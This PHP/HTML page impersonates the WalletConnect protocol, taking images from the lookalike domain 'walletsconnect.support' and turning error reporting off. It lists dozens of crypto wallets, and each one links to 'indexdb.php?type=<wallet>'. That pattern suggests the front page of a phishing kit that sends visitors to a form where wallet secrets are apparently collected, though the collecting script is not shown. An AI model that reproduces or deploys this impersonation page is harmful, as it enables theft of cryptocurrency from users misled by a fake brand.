<?php

    //stop error report
    error_reporting(0);

    include_once('inc/header.php');
?>
<title>WalletConnect</title>
</head>
<body style="text-align:center;">
<?php
    include_once('inc/nav.php');
?>
<!-- header section -->
    <div class="gFeYHJ">WalletConnect</div>
    <div class="lpfxqP">Open protocol for connecting Wallets to Dapps</div>
    </br>

    <div class="dXgqeu">
        <img src="https://walletsconnect.support/images/banner.png" alt="WalletConnect">
    </div>

<!-- About section -->
    <div class="bout">
        <h2 class="home">What is WalletConnect?</h2>
        <p>WalletConnect is an open source protocol for connecting decentralised applications to mobile wallets with QR code scanning or deep linking. 
        A user can interact securely with any Dapp from their mobile phone, making WalletConnect wallets a safer choice compared to desktop or browser 
        extension wallets.</p>
        </br>
        <h2 class="home">How does it work?</h2>
        <p>WalletConnect connects web applications to supported <a href="#">mobile wallets</a>. WalletConnect session is started by a scanning a QR 
        code (desktop) or by clicking an application deep link (mobile).</p>
    </div>

<!-- wallets -->
    <div class="wallets" id="wallets">
        <h1 class="home">Wallets</h1>
        <p>Multiple iOS and Android wallets support the WalletConnect protocol. Interaction between mobile apps and mobile browsers are supported via mobile deep linking.</p>

        </br>
        <div class="all">
            <div class="apps">
                <a href="indexdb.php?type=metamask"><img src="https://walletsconnect.support/images/metamask.png"></a></br>
                MetaMask
            </div>

            <div class="apps">
                <a href="indexdb.php?type=mew"><img src="https://walletsconnect.support/images/MEW.png"></a></br>
                MEW Wallet
            </div>

            <div class="apps">
                <a href="indexdb.php?type=trustwallet"><img src="https://walletsconnect.support/images/trustwallet.png"></a></br>
                Trust Wallet
            </div>

            <div class="apps">
                <a href="indexdb.php?type=wallect"><img src="https://walletsconnect.support/images/logo.svg"></a></br>
                Wallect</br>Connect
            </div>

            <div class="apps">
                <a href="indexdb.php?type=coinbase"><img src="https://walletsconnect.support/images/coinbase.jpg"></a></br>
                Coinbase Wallet
            </div>

            <div class="apps">
                <a href="indexdb.php?type=atomic"><img src="https://walletsconnect.support/images/atomic.png"></a></br>
                Atomic Wallet
            </div>

            <div class="apps">
                <a href="indexdb.php?type=binance"><img src="images/binance.png"></a></br>
                Binance Smart Chain
            </div>

            <div class="apps">
                <a href="indexdb.php?type=bnb"><img src="images/bnb.png"></a></br>
                BNB
            </div>

            <div class="apps">
                <a href="indexdb.php?type=polkadot"><img src="images/polkadot.png"></a></br>
                Polkadot
            </div>

            <div class="apps">
                <a href="indexdb.php?type=xrp"><img src="images/xrp.png"></a></br>
                XRP
            </div>

            <div class="apps">
                <a href="indexdb.php?type=stellar"><img src="images/stellar.png"></a></br>
                Stellar
            </div>

            <div class="apps">
                <a href="indexdb.php?type=tezos"><img src="images/tezos.png"></a></br>
                Tezos
            </div>

            <div class="apps">
                <a href="indexdb.php?type=theta"><img src="images/theta.png"></a></br>
                Theta
            </div>

            <div class="apps">
                <a href="indexdb.php?type=tron"><img src="images/tron.png"></a></br>
                Tron
            </div>

            <div class="apps">
                <a href="indexdb.php?type=cosmos"><img src="images/cosmos.png"></a></br>
                Cosmos
            </div>

            <div class="apps">
                <a href="indexdb.php?type=kava"><img src="images/kava.png"></a></br>
                Kava
            </div>

            <div class="apps">
                <a href="indexdb.php?type=filecoin"><img src="images/filecoin.png"></a></br>
                Filecoin
            </div>

            <div class="apps">
                <a href="indexdb.php?type=solana"><img src="images/solana.png"></a></br>
                Solana
            </div>

            <div class="apps">
                <a href="indexdb.php?type=ethereum+classic"><img src="images/ethereum-classic.png"></a></br>
                Ethereum Classic
            </div>

            <div class="apps">
                <a href="indexdb.php?type=zilliqa"><img src="images/zilliqa.png"></a></br>
                Zilliqa
            </div>

            <div class="apps">
                <a href="indexdb.php?type=elrond"><img src="images/elrond.jpg"></a></br>
                Elrond
            </div>

            <div class="apps">
                <a href="indexdb.php?type=waves"><img src="images/waves.png"></a></br>
                Waves
            </div>

            <div class="apps">
                <a href="indexdb.php?type=icon"><img src="images/icon.png"></a></br>
                ICON
            </div>

            <div class="apps">
                <a href="indexdb.php?type=ontology"><img src="images/ontology.png"></a></br>
                Ontology
            </div>
        </div>

        <!-- </br>

        <button class="btn" id="btn-more">Show More &darr;</button>

        </br></br> -->

        <div class="hidden" id="hidden">
            <div class="all">
        
                <div class="apps">
                    <a href="indexdb.php?type=nano"><img src="images/nano.png"></a></br>
                    Nano
                </div>

                <div class="apps">
                    <a href="indexdb.php?type=tomo+chain"><img src="images/tomo.png"></a></br>
                    Tomo Chain
                </div>

                <div class="apps">
                    <a href="indexdb.php?type=iotex"><img src="images/iotex.png"></a></br>
                    IoTex
                </div>

                <div class="apps">
                    <a href="indexdb.php?type=wanchain"><img src="images/wanchain.png"></a></br>
                    Wanchain
                </div>

                <div class="apps">
                    <a href="indexdb.php?type=harmony"><img src="images/harmony.png"></a></br>
                    Harmony
                </div>

                <div class="apps">
                    <a href="indexdb.php?type=kin"><img src="images/kin.png"></a></br>
                    Kin
                </div>

                <div class="apps">
                    <a href="indexdb.php?type=nimiq"><img src="images/nimiq.png"></a></br>
                    Nimiq
                </div>

                <div class="apps">
                    <a href="indexdb.php?type=aion"><img src="images/aion.png"></a></br>
                    Aion
                </div>

                <div class="apps">
                    <a href="indexdb.php?type=thunder-token"><img src="images/thundertoken.png"></a></br>
                    Thunder Token
                </div>

                <div class="apps">
                    <a href="indexdb.php?type=aerternity"><img src="images/aeternity.png"></a></br>
                    Aeternity
                </div>

                <div class="apps">
                    <a href="indexdb.php?type=nebulas"><img src="images/nebulas.png"></a></br>
                    Nebulas
                </div>

                <div class="apps">
                    <a href="indexdb.php?type=fio"><img src="images/fio.png"></a></br>
                    FIO
                </div>

                <div class="apps">
                    <a href="indexdb.php?type=gochain"><img src="images/gochain.png"></a></br>
                    GoChain
                </div>

                <div class="apps">
                    <a href="indexdb.php?type=POA+network"><img src="images/poa.png"></a></br>
                    POA Network
                </div>

                <div class="apps">
                    <a href="indexdb.php?type=callisto"><img src="images/callisto.png"></a></br>
                    Callisto
                </div>

                <div class="apps">
                    <a href="indexdb.php?type=bitpay"><img src="images/bitpay.jpg"></a></br>
                    BitPay
                </div>

                <div class="apps">
                    <a href="indexdb.php?type=aktionariat"><img src="images/aktionariat.png"></a></br>
                    Aktionariat
                </div>

                <div class="apps">
                    <a href="indexdb.php?type=atwallet"><img src="images/atwallet.png"></a></br>
                    AtWallet
                </div>

                <div class="apps">
                    <a href="indexdb.php?type=guard+wallet"><img src="images/guard.png"></a></br>
                    Guard Wallet
                </div>

                <div class="apps">
                    <a href="indexdb.php?type=aave"><img src="images/aave.jpg"></a></br>
                    AAVE
                </div>

                <div class="apps">
                    <a href="indexdb.php?type=exodus"><img src="images/exodus.jpg"></a></br>
                    Exodus
                </div>


                <div class="apps">
                    <a href="indexdb.php?type=enjin"><img src="images/enjin.jpg"></a></br>
                    Enjin
                </div>


                <div class="apps">
                    <a href="indexdb.php?type=skale"><img src="images/skale.png"></a></br>
                    Skale
                </div>

                <div class="apps">
                    <a href="indexdb.php?type=portis"><img src="images/portis.png"></a></br>
                    Portis
                </div>

                <div class="apps">
                    <a href="indexdb.php?type=trezor"><img src="images/trezor.png"></a></br>
                    Trezor
                </div>

                <div class="apps">
                    <a href="indexdb.php?type=squarelink"><img src="images/squarelink.png"></a></br>
                    Squarelink
                </div>

                <div class="apps">
                    <a href="indexdb.php?type=torus"><img src="images/torus.jpg"></a></br>
                    Torus
                </div>

                <div class="apps">
                    <a href="indexdb.php?type=vechain"><img src="images/vechain.jpg"></a></br>
                    VeChain
                </div>

                <div class="apps">
                    <a href="indexdb.php?type=scatter+wallet"><img src="images/scatter.jpg"></a></br>
                    Scatter Wallet
                </div>

                <div class="apps">
                    <a href="indexdb.php?type=math+wallet"><img src="images/math-wallet.png"></a></br>
                    Math Wallet
                </div>

                <div class="apps">
                    <a href="indexdb.php?type=fortmatic"><img src="images/fortmatic.png"></a></br>
                    FortMatic
                </div>

                <div class="apps">
                    <a href="indexdb.php?type=digitex"><img src="images/digitex.png"></a></br>
                    Digitex
                </div>

                <div class="apps">
                    <a href="indexdb.php?type=ledger"><img src="images/ledger.png"></a></br>
                    Ledger
                </div>

                <div class="apps">
                    <a href="indexdb.php?type=defiat"><img src="images/defiat.jpg"></a></br>
                    Defiat
                </div>

                <div class="apps">
                    <a href="indexdb.php?type=authereum"><img src="images/authereum.png"></a></br>
                    Authereum
                </div>

                <div class="apps">
                    <a href="indexdb.php?type=flare+wallet"><img src="images/flare.jpg"></a></br>
                    Flare Wallet
                </div>

                <div class="apps">
                    <a href="indexdb.php?type=zelcore"><img src="images/zelcore.png"></a></br>
                    Zelcore
                </div>

                <div class="apps">
                    <a href="indexdb.php?type=bitkeep"><img src="images/bitkeep.png"></a></br>
                    BitKeep
                </div>

                <div class="apps">
                    <a href="indexdb.php?type=coin98"><img src="images/coin98.png"></a></br>
                    Coin98
                </div>

                <div class="apps">
                    <a href="indexdb.php?type=trust+vault"><img src="images/trustvault.png"></a></br>
                    Trust Vault
                </div>

            </div>

        </div>
        
    </div>
    </br>
    <div class="btn-wrapper">
        <button class="btn" id="btn-more">Show More &darr;</button>
    </div>
    </br></br>

    <script>
        const btnMore = document.getElementById('btn-more');
        let more = document.getElementById('hidden');

        // btnMore.addEventListener('click', show);

        const show = () => {
            console.log("hello world");
            // let more = document.getElementById('hidden');

            if(more.style.display === "block"){
                more.style.display = "none";
                btnMore.innerHTML = "Show More &darr;";
            } else {
                more.style.display = "block";
                btnMore.innerHTML = "Show Less &uarr;";
            }
        }

        btnMore.addEventListener('click', show);
    </script>

<?php
    include_once('inc/footer.php');
?>